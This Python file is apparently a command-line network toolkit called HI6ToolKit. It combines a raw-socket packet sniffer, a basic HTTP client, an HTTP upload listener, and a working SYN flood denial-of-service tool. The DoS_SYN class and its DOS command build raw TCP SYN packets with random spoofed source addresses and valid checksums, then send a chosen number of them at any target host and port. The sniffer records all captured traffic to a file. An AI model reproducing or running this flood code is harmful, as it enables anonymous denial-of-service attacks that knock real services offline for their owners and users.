import socket
import struct
import sys
import time
import ssl
import os
import random
import argparse


class Constant :
    MODULE : bool = __name__ != "__main__"
    TIME : int = round(time.time())
    ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
    SLASH : str = chr(47)
    SPACE : str = chr(32)
    TOOLS : dict = dict()
    INFO : str = f"""\n
        [System] : [{sys.platform.upper()}, {time.ctime()}]
        [Hostname] : [{socket.gethostname()}]
        [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}]

        [GitHub] : [github.com/HI6Cypher]
        [Email] : [huaweisclu31@hotmail.com]\n\n"""

    ERROR : str = lambda arg : print(f"Invalid argument : \"{arg}\"\nType : \"python HI6ToolKit.py --help or -h\"", file = sys.stderr)

    EXCEPTION : None = lambda error : print(f"[!] Error : {error or None}", file = sys.stderr)

    def SAVE(data : str) :
        path = f"data_{Constant.TIME}.txt"
        mode = "a" if os.path.exists(path) else "x"
        print(data, file = open(path, mode))
        return None


class Sniff :
    def __init__(self, host : str, proto : int) :
        self.host = host
        self.proto = proto
        self.generator = None

    def __repr__(self) :
        return f"{self.__class__} {self.__dict__}"

    def __str__(self) :
        return f"Sniff : \n\t{self.host}\n\t{self.proto}"

    def __iter__(self) :
        self.generator = self.sniff()
        return self

    def __next__(self) :
        return next(self.generator)

    @staticmethod
    def ip_header(raw_payload : bytes) :
        payload = struct.unpack("!BBHHHBBH4s4s", raw_payload)
        ver = payload[0] >> 4
        ihl = (payload[0] & 0xf) * 4
        tos = payload[1]
        tln = payload[2]
        idn = payload[3]
        flg = payload[4] >> 13
        oft = payload[4] & 0x1fff
        ttl = payload[5]
        protos = {socket.IPPROTO_ICMP : "ICMP",
                socket.IPPROTO_TCP : "TCP",
                socket.IPPROTO_UDP : "UDP"}
        prt = protos[payload[6]] if payload[6] in protos.keys() else payload[6]
        csm = hex(payload[7])
        src = socket.inet_ntop(socket.AF_INET, payload[8])
        dst = socket.inet_ntop(socket.AF_INET, payload[9])
        return (ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst)

    @staticmethod
    def icmp_header(raw_payload : bytes) :
        payload = struct.unpack("!BBHHH", raw_payload[:8])
        typ = payload[0]
        cod = payload[1]
        csm = hex(payload[2])
        idn = payload[3]
        seq = payload[4]
        data = raw_payload[8:]
        return (typ, cod, csm, idn, seq, data)

    @staticmethod
    def tcp_header(raw_payload : bytes) :
        payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
        src = payload[0]
        dst = payload[1]
        seq = payload[2]
        acn = payload[3]
        oft = (payload[4] >> 4) * 4
        flg = payload[5]
        urg = (flg & 32) >> 5
        ack = (flg & 16) >> 4
        psh = (flg & 8) >> 3
        rst = (flg & 4) >> 2
        syn = (flg & 2) >> 1
        fin = flg & 1
        flg = {
            "urg" : urg,
            "ack" : ack,
            "psh" : psh,
            "rst" : rst,
            "syn" : syn,
            "fin" :fin
                }
        win = payload[6]
        csm = hex(payload[7])
        urg = payload[8]
        data = raw_payload[oft:]
        return (src, dst, seq, acn, oft, flg, win, csm, urg, data)

    @staticmethod
    def udp_header(raw_payload : bytes) :
        payload = struct.unpack("!HHHH", raw_payload[:8])
        src = payload[0]
        dst = payload[1]
        tln = payload[2]
        csm = hex(payload[3])
        data = raw_payload[8:]
        return (src, dst, tln, csm, data)

    @staticmethod
    def indent_data(data : bytes) :
        data = str(data).strip("b'\"")
        text = "\t\t\t"
        for i in range(0, (len(data) // 64) + 1) :
            text += data[i * 64 : (i * 64) + 64] + "\n\t\t\t"
        return text

    def __proto(self) :
        if not Constant.ISOS and self.proto == socket.IPPROTO_TCP :
            raise OSError("Can't use socket.IPPROTO_TCP")
        return self.proto

    def parse_headers(self, data : bytes) :
        parsed_header = str()
        t = "\n\t\t"
        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = self.ip_header(data[:20])
        parsed_header += f"\n[*][Connection]{Constant.TIME:_^33}\n\n"
        text = f"\tIPv4 Packet :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
        text += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
        text += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
        text += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
        parsed_header += text + "\n\n"

        if prt == "ICMP" :
            typ, cod, csm, idn, seq, data = self.icmp_header(data[ihl:])
            text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.indent_data(data)}"
            parsed_header += text + "\n"

        elif prt == "TCP" :
            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(data[ihl:])
            text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
            parsed_header += text + "\t"
            text = f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}"
            parsed_header += text + t
            text = f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.indent_data(data)}"
            parsed_header += text

        elif prt == "UDP" :
            src, dst, tln, csm, data = self.udp_header(data[ihl:])
            text = f"\tUDP Datagram :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.indent_data(data)}"
            parsed_header += text + "\n"
        return parsed_header

    def sniff(self) :
        try :
            if not Constant.MODULE :
                print(Constant.INFO)
                input("\nPress ENTER to continue...\n")
            while True :
                yield self.__sniff()
        except KeyboardInterrupt :
            exit(1)

    def __sniff(self) :
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
            sniff.bind((self.host, 0))
            sniff.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            if not Constant.ISOS : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            try :
                while True :
                    raw_data = sniff.recvfrom(65535)[0]
                    if raw_data :
                        parsed_headers = self.parse_headers(raw_data)
                        parsed_headers = parsed_headers.expandtabs(4)
                        Constant.SAVE(parsed_headers)
                        if not Constant.ISOS : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
                        return parsed_headers
            except KeyboardInterrupt :
                if not Constant.ISOS : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
                exit(1)


class DoS_SYN :
    def __init__(self, host: str, port : int) :
        self.host = socket.gethostbyname(host)
        self.port = int(port)
        self.generator = None

    def __repr__(self) :
        return f"{self.__class__} {self.__dict__}"

    def __str__(self) :
        return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"

    def __iter__(self) :
        self.generator = self.flood()
        return self

    def __next__(self) :
        return next(self.generator)

    @staticmethod
    def ip_header(src : str, dst : str,
                ver : int = 4, ihl : int = 5,
                tos : int = 0, tln : int = 40,
                idn : int = 0, flg : int = 0,
                oft : int = 0, ttl : int = 255,
                prt : int = socket.IPPROTO_TCP, csm : int = 0) :
        ihl_ver = (ver << 4) + ihl
        flg_oft = (flg << 13) + oft
        datagram = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tln, idn,
                        flg_oft, ttl, prt, csm, src, dst)
        return datagram

    @staticmethod
    def tcp_header(srp : int = 1337, dsp : int = 0,
                seq : int = 0, acn : int = 0,
                oft : int = 5, urg : int = 0,
                ack : int = 0, psh : int = 0,
                rst : int = 0, syn : int = 0,
                fin : int = 0, win : int = 65535,
                csm : int = 0, urp : int = 0) :
        oft <<= 12
        res = 0 << 6
        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
        oft_res_flg = oft + res + flg
        segment = struct.pack("!HHLLHHHH", srp, dsp, seq, acn, oft_res_flg, win, csm, urp)
        return segment

    @staticmethod
    def pseudo_header(src : str, dst : str,
                res : int = 0, prt : int = socket.IPPROTO_TCP,
                pln : int = 0) :
        segment = struct.pack("!4s4sBBH", src, dst, res, prt, pln)
        return segment

    @staticmethod
    def checksum(data : bytes) :
        checksum = 0
        for i in range(0, len(data), 2) :
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 65535)
        checksum = (~ checksum) & 65535
        return checksum

    @staticmethod
    def random_ip() :
        secs = [str(random.randint(0, 255)) for _ in range(0, 4)]
        return ".".join(secs)

    @staticmethod
    def load_symbol(count : int, rate : int, char : str) :
        if count > rate :
            raise ValueError("\"count\" argument must be smaller than \"rate\"")
        sec = rate >> 5
        return (count // sec) * char

    def prepare(self) :
        randip = self.random_ip()
        randidn = random.randint(0, 65535)
        src = socket.inet_pton(socket.AF_INET, randip)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum = self.checksum(ip_header)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
        randseq = random.randint(0, 65535)
        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
        data = tcp_header + pseudo_header
        tcp_checksum = self.checksum(data)
        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
        payload = ip_header + tcp_header
        return payload

    def flood(self) :
        try :
            if not Constant.MODULE :
                print(Constant.INFO)
                input("\nPress ENTER to continue...\n")
            while True :
                self.__flood()
                yield None
        except KeyboardInterrupt :
            exit(1)

    def __flood(self) :
        payload = self.prepare()
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
            flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            flood.connect((self.host, self.port))
            flood.sendto(payload, (self.host, self.port))
            flood.shutdown(socket.SHUT_RDWR)
            return None


class HTTP_Request :
    def __init__(self, host : str, port : int, method : str, end : str, https : bool) :
        self.host = host
        self.port = int(port)
        self.method = method if method in ("GET", "HEAD") else "GET"
        self.end = end if end else "/"
        self.https = bool(https)
        self.request_header = str()
        self.response = bytes()
        self.response_header = str()

    def __repr__(self) :
        return f"{self.__class__} {self.__dict__}"

    def __str__(self) :
        return f"HTTP_Request : \n\t{self.host}\n\t{self.port}"

    def request(self) :
        try :
            if not Constant.MODULE :
                print(Constant.INFO)
                input("\nPress ENTER to continue...\n")
            self.__request()
        except KeyboardInterrupt :
            exit(1)

    def __request(self) :
        if self.https : sslcontext = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http :
            http.settimeout(30)
            http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
            payload = [
                        f"{self.method} {self.end} HTTP/1.1",
                        f"Host: {self.host}",
                        "User-Agent: HI6ToolKit",
                        "Accept: */*",
                        "Connection: close",
                        "\r\n"]
            payload = "\r\n".join(payload)
            self.request_header = payload
            if not Constant.MODULE : print(payload)
            http.connect((self.host, self.port))
            http.send(payload.encode())
            raw_data = bytes()
            while True :
                response = http.recv(1024)
                if not response :
                    raw_data = raw_data.split(b"\r\n\r\n", 1)
                    self.response_header = raw_data[0]
                    self.response = raw_data[-1]
                    if not Constant.MODULE :
                        print(self.response_header, end = "\n\n")
                        if self.method == "GET" : print(self.response)
                    if self.https : http.close()
                    break
                else :
                    raw_data += response
                    continue
        return None


class Listen :
    def __init__(self, host : str, port : int, timeout : int, buffer : int) :
        self.host = host
        self.port = port
        self.timeout = timeout
        self.buffer = buffer
        self.data = bytes()

    def __repr__(self) :
        return f"{self.__class__} {self.__dict__}"

    def __str__(self) :
        return f"Listen : \n\t{self.host}\n\t{self.port}"

    def listen(self) :
        try :
            if not Constant.MODULE :
                print(Constant.INFO)
                input("\nPress ENTER to continue...\n")
            while True :
                self.__listen()
                yield self.data
        except KeyboardInterrupt :
            exit(1)

    @staticmethod
    def readbuffer(sock : socket.socket, buffer : int) :
        payload = bytes()
        while len(payload) != buffer :
            payload += sock.recv(buffer - len(payload))
        else :
            return payload

    @staticmethod
    def readline(sock : socket.socket) :
        line = bytes()
        while not line.endswith(b"\n") :
            line += sock.recv(1)
        else :
            return line

    @staticmethod
    def get_length(header : bytes) :
        headers = header.split(b"\r\n")
        for header in headers :
            if header.startswith(b"Content-Length") :
                return int(header[16:])
        else :
            return 0

    @staticmethod
    def tmp_file(file_name : str) :
        path = f"./{file_name}.tmp"
        mode = "xb" if os.path.exists(path) else "ab"
        return open(path, mode)

    def get_part(self, length : int) :
        nparts = length // self.buffer
        ntail = length % self.buffer
        return nparts, ntail

    def __listen(self) :
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listen :
                listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listen.settimeout(self.timeout)
                listen.bind((self.host, self.port))
                listen.listen()
                try :
                    while True :
                        header = bytes()
                        conn, addr = listen.accept()
                        while not header.endswith(b"\r\n\r\n") :
                            header += self.readline(conn)
                        else :
                            status, path, version = header.split(b"\r\n", 1)[0].split(b" ")
                            length = self.get_length(header) if status not in (b"GET", b"HEAD", b"CONNECT") else 0
                            self.data = header
                            if not Constant.MODULE : print(self.data)
                        if length and status not in (b"GET", b"HEAD", b"CONNECT") :
                            conn.settimeout(5)
                            parts, tail = self.get_part(length)
                            file_name = path[1:].decode() if path.startswith(b"/") else path.decode()
                            file = self.tmp_file(file_name)
                            for part in range(parts) :
                                file.write(self.readbuffer(conn, self.buffer))
                            else :
                                if tail != 0 : file.write(self.readbuffer(conn, tail))
                                conn.send(b"%b 200 OK\r\nConnection: close\r\n" % version)
                                file.close()
                                break
                        else :
                            break
                except KeyboardInterrupt :
                    exit(1)
            return None


if not Constant.MODULE :
    args = None
    def manage_args() :
        parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
        parser.add_argument("Tool", type = str, help = "To specify tool [SNIFF, DOS, HTTP, LISTEN]")
        parser.add_argument("-m", "--method", type = str, help = "sets protocol type")
        parser.add_argument("-x", "--host", type = str, help = "sets host")
        parser.add_argument("-p", "--port", type = int, help = "sets port")
        parser.add_argument("-s", "--secure", action = "store_true", help = "sets secure socket(ssl)")
        parser.add_argument("-e", "--endpoint", type = str, help = "sets endpoint")
        parser.add_argument("-r", "--rate", type = int, help = "sets rate(number of packets)")
        parser.add_argument("-t", "--time", type = int, help = "sets timeout")
        parser.add_argument("-b", "--buffer", type = int, help = "sets bufferSize, should be in (1024, 2048, 4096,...)")
        args = parser.parse_args()
        return args

    def command(tool : str) :
        def commit(func) :
            Constant.TOOLS[tool] = func
        return commit

    def invalid_args(arg : str) :
        Constant.ERROR(arg)
        return exit(1)

    def check(**kwargs) :
        nones = list()
        for k, v in kwargs.items() :
            if not v : nones.append(k)
        return (True, nones) if not nones else (False, nones)

    @command(tool = "INFO")
    def info_args() :
        print(Constant.INFO)
        return None

    @command(tool = "SNIFF")
    def Sniff_args() :
        global args
        args = {
            "host" : args.host,
            "proto" : args.method
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        protos = {
            "TCP" : socket.IPPROTO_TCP,
            "UDP" : socket.IPPROTO_UDP,
            "ICMP" : socket.IPPROTO_ICMP
        }
        if args["proto"].upper() not in protos : invalid_args(proto)
        host = args["host"]
        proto = protos[args["proto"].upper()]
        sniff = Sniff(host, proto)
        for packet in sniff :
            print(packet)
        return None

    @command(tool = "DOS")
    def DoS_SYN_args() :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "rate" : args.rate
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        rate = args["rate"]
        while rate % 32 != 0 : rate += 1
        flood = DoS_SYN(host, port)
        flood = iter(flood)
        for i in range(1, rate + 1) :
            next(flood)
            if not Constant.MODULE : print(f"[+] {DoS_SYN.load_symbol(i, rate, Constant.SLASH)}  {i} packets sent", end = "\r", flush = True)
        else :
            if not Constant.MODULE :
                time.sleep(2)
                end_time = round((time.time() - Constant.TIME), 2)
                print("\n[+] All packets have sent")
                print(f"[-] {end_time}s")

        return None

    @command(tool = "HTTP")
    def HTTP_Request_args() :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "method" : args.method,
            "endpoint" : args.endpoint,
            "secure" : args.secure
            }
        success, nones = check(host = args["host"], port = args["port"], method = args["method"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"] if args["port"] else 443 if args["secure"] else 80
        method = args["method"].upper()
        path = args["endpoint"]
        secure = args["secure"]
        client = HTTP_Request(host, port, method, path, secure)
        client.request()
        return None

    @command(tool = "LISTEN")
    def Listen_args() :
        global args
        args = {
            "host" :  args.host,
            "port" : args.port,
            "timeout" :  args.time,
            "buffer" : args.buffer
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        timeout = args["timeout"]
        buffer = args["buffer"]
        listen = Listen(host, port, timeout, buffer)
        gen = listen.listen()
        for i in gen :
            Constant.SAVE(i.decode())
        return None

    def main() :
        global args
        os.system("clear || cls")
        args = manage_args()
        if args.Tool.upper() in Constant.TOOLS :
            try :
                Constant.TOOLS[args.Tool.upper()]()
            except Exception as error:
                invalid_args(error)
        else :
            invalid_args(args.Tool.upper())
        return True

    main()
